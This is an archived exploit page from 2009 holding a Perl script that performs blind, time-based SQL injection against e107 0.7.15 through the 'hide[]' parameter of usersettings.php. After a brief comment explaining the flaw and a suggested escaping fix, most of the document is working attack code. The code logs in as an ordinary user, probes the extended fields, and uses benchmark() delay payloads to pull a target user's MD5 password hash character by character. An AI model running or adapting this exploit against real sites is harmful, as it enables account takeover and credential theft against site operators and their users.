<html><head><title>e107 <= 0.7.15 (extended_user_fields) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/env perl
#
# e107 &lt;= 0.7.15 &quot;extended_user_fields&quot; Blind SQL Injection Exploit
#
# Description
# -------------------------------------------------------------------
# e107 contains one flaw that allows an attacker to carry out an SQL
# injection attack. The issue is due to the &quot;usersettings.php&quot; script 
# not properly saniting user-supplied input to the hide[] key. 
# This may allow an attacker to inject or manipulate sql queries in
# the backend database if magic_quotes_gpc = off.
# -------------------------------------------------------------------
# Code Details (usersettings.php) 
# -------------------------------------------------------------------
# Line 433 - 441 
#
# if($ue_fields) {
#    $hidden_fields = implode(&quot;^&quot;, array_keys($_POST['hide'])); &lt;------ {1}
#     
#     if($hidden_fields != &quot;&quot;)
#     {
#	 $hidden_fields = &quot;^&quot;.$hidden_fields.&quot;^&quot;;  
#     }
#     $ue_fields .= &quot;, user_hidden_fields = '&quot;.$hidden_fields.&quot;'&quot;; &lt;---- {2}
#   }
#
# Line 470 - 476
#  
#  if($ue_fields) 
#  {
#    [etc..]
#    $sql-&gt;db_Update(&quot;user_extended&quot;, $ue_fields.&quot; WHERE user_extended_id = '&quot;.intval($inp).&quot;'&quot;);
#  }  
#  
# ue[] POST variable needs a valid key
# such as &quot;aim&quot;,&quot;msn&quot; or other user_extended_fields
# (@fields array). 
#
# Fix this sql injection using (php function)
# mysql_real_escape_string to the POST 'hide' key,
# otherwise find a way to fix it. dont care
# ------------------------------------------
# Discovered &amp; Written 
# by Juri Gianni aka yeat - staker[at]hotmail[dot]it
#  
# Thanks to
# ---------------------------------------------
# JosS,girex,str0ke,certaindeath,plucky
# #zeroidentity chan - http://zeroidentity.org
# ---------------------------------------------
# http://www.youtube.com/watch?v=0rgInHvW8Ic
# http://www.youtube.com/watch?v=O2y62xcUJ8E
# ---------------------------------------------

use LWP::UserAgent;


my $prefix = &quot;e107_&quot;; # default table_prefix
my $type_i = undef;
my $sock_u = new LWP::UserAgent;

my ($domain,$user_name,$user_pwd,$target) = @ARGV;


e107::Usage() unless scalar (@ARGV) &gt; 3; 
  
e107::Login($user_name,$user_pwd);
$type_i = e107::ExtendedField();
e107::Exploit();
    

sub e107::Usage
{
       print &quot;e107 &lt;= 0.7.15 'extended_user_fields' Blind SQL Injection Exploit\n&quot;;
       print &quot;Usage: perl xpl.pl http://[host]/[path] [username] [password] [target id]\n&quot;;
       print &quot;Usage: perl xpl.pl http://localhost/e107 yeat an4rchy 1\n&quot;;
       exit;
}       

sub e107::Exploit
{
     e107::Vulnerable();
     e107::BruteForce(); 
}



sub e107::SqlQuery
{
       my ($do_query,$response,$start,$down,$element);
       
       $do_query = $_[0] || die $!;
       
       $start = time();
  
       $response = $sock_u-&gt;post($domain.'/usersettings.php',
                               [
                                 &quot;email&quot;           =&gt; 'doesnt@exists.net',
                                 &quot;ue[user_$type_i]&quot; =&gt; 1,
                                 &quot;hide[$do_query]&quot; =&gt; 1,
                                 &quot;updatesettings&quot;  =&gt; 'Save Settings',
                              ]) or die $!;
       $down = time();
       
       return $down - $start;                            
}



sub e107::CheckField
{
       my ($do_query,$response,$start,$down,$element);
       
       $do_query = $_[0];
       $element  = $_[1] || die $!;  
       
       
       $start = time();
  
       $response = $sock_u-&gt;post($domain.'/usersettings.php',
                               [
                                 &quot;email&quot;           =&gt; 'doesnt@exists.net',
                                 &quot;ue[user_$element]&quot; =&gt; 1,
                                 &quot;hide[$do_query]&quot; =&gt; 1,
                                 &quot;updatesettings&quot;  =&gt; 'Save Settings',
                              ]) or die $!;
       $down = time();
       
       return $down - $start;                            
}
      
      

sub e107::ExtendedField
{
       my @fields = ('yeat','aim','birthday','icq','language','location','msn','yahoo','homepage');
       
       my $query = &quot;\x27/**/OR/**/CASE/**/WHEN(1&gt;0)/**/THEN&quot;.
                   &quot;/**/benchmark(100000000,CHAR(0))/**/END#&quot;;
                   
       for (my $i=1;$i&lt;8;$i++) {
             
             if (e107::CheckField($query,$fields[$i]) &gt; 6) {
                return $fields[$i]; last;
             }     
             unless ($i != 8 &amp;&amp; $fields[$i]) {
               die(&quot;Site not vulnerable..\n&quot;);
             }
       }          
} 
        
        

sub e107::SqlBrute
{
       my $ascii = $_[0];
       my $limit = $_[1] || 1;
       
       my $sql_query = &quot;\x27/**/OR/**/(SELECT/**/IF((ASCII(SUBSTRING(user_password,$limit,1))&quot;.
                       &quot;=$ascii),benchmark(200000000,CHAR(0)),0)/**/FROM/**/${prefix}user/**/&quot;.
                       &quot;WHERE/**/user_id=$target)#&quot;;
       
       return $sql_query;                
}



sub e107::BruteForce
{
       my $i = 1;
       my @charset = (97..102,48..57);
       my $convert = undef;
       my $result  = undef;
       
       
       for ($i..32) {
             
             foreach $convert (@charset) {
                   
                   if (e107::SqlQuery(e107::SqlBrute($convert,$i)) &gt; 9) {
                      syswrite(STDOUT,chr($convert)); $i++;
                      last; $result .= chr($convert);
                   }              
             }
       }
       
       unless (length($result) != 32) {
          print &quot;\nHash MD5: $result\n&quot;;
          print &quot;User ID: $target\n&quot;;
       }
}



sub e107::Vulnerable
{             
       my @fields = ('yeat','aim','birthday','icq','language','location','msn','yahoo','homepage');
       
       for (my $i=1;$i&lt;8;$i++) {
       
            if ($fields[$i] eq $type_i) {
               print &quot;Exploiting..\n&quot;; last;
            }
            else {
               die (&quot;Site not vulnerable..\n&quot;);
            }
       }             
}       
    
                         

sub e107::Login
{
        my ($username,$password) = @_;
        my ($result,$response);
        
        $response =  $sock_u-&gt;post($domain.'/signup.php',
                                 [
                                   username  =&gt; $username,
                                   userpass  =&gt; $password,
                                   userlogin =&gt; 'Login',
                                   autologin =&gt; 0
                                 ]) or die $!;
        
        $result = $response-&gt;as_string;                         
                                 
        if ($result =~ /e107cookie=(\d+)\.([0-9a-f]{32})/i) {
             $sock_u-&gt;default_header('Cookie' =&gt; &quot;e107cookie=$1.$2;&quot;); 
             $sock_u-&gt;agent('Lynx (textmode) - Logged');
        }
        else {
           die(&quot;Login failed..\n&quot;);
        }   
}

# milw0rm.com [2009-04-20]</pre></html>